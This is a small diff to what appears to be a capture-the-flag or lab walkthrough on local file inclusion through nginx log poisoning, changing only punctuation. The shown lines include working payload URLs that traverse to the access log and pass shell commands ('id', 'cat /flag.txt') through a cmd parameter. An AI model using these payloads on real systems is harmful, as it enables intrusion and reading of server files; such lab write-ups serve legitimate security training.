@@ -593,6 +593,7 @@ Example:
 http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id
 `
 **Note thay will show you the result in the log file that place where your php code injected so read the log file carefully**
-So Now you have the command execution on the system now use the following payload to get the `flag.txt` file content from the root directory(`/`)
+So Now you have the command execution on the system now use the following payload to get the `flag.txt` file content from the root directory(`/`).
+
 Payload: `http://ip:port/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /flag.txt
 `
